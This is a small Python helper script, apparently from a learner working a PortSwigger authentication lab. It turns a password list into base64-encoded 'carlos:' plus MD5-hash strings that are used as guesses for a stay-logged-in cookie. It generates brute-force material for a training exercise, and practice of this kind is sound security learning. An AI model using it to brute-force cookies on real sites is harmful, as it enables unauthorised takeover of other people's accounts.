#!/usr/bin/python3

# The Main Idea of the script is that it takes from you passwords file and then hash those passwords with MD5 Algorithm hash and then append to this hash the string 'carlos:' and put the output of all of these in new_file, i make this script cuz i need it while i solving lab that requires from me to change the cookie value like this to brutforce another user's password on the system and the name of the lab is : (Brute-forcing a stay-logged-in cookie) on PortSwigger under the Authentication Labs

import sys
import hashlib
import base64


def Base64_Encoder_for_list_of_hashed_passwords(file_path):

	try:

		with open(file_path, 'r') as file:
			passwords = file.readlines()

		Base64_Encoding_passwords = []
		for password in passwords:
			password = password.strip()
			hashed_password = hashlib.md5(password.encode()).hexdigest()
			string_to_encode = 'carlos:' + hashed_password

			base64_encoded_password = base64.b64encode(string_to_encode.encode('utf-8'))
			Base64_Encoding_passwords.append(base64_encoded_password.decode('utf-8') + '\n')

		new_file_path = 'b64encoded_' + file_path

		with open(new_file_path, 'w') as new_file:
			new_file.writelines(Base64_Encoding_passwords)

		print("Hashed passwords saved successfully in the file: " + new_file_path)


	except FileNotFoundError:
		print("File not found.")



def main():
    if len(sys.argv) > 1:
        file_path = sys.argv[1]
        Base64_Encoder_for_list_of_hashed_passwords(file_path)
    else:
        print("Please provide the file path as an argument.")


if __name__ == "__main__":
    main()


    
   
# Usage:

#   └─$ sudo ./Base64Encoder_passwords.py password_list.txt
#   Hashed passwords saved successfully in the file: b64encoded_password_list.txt
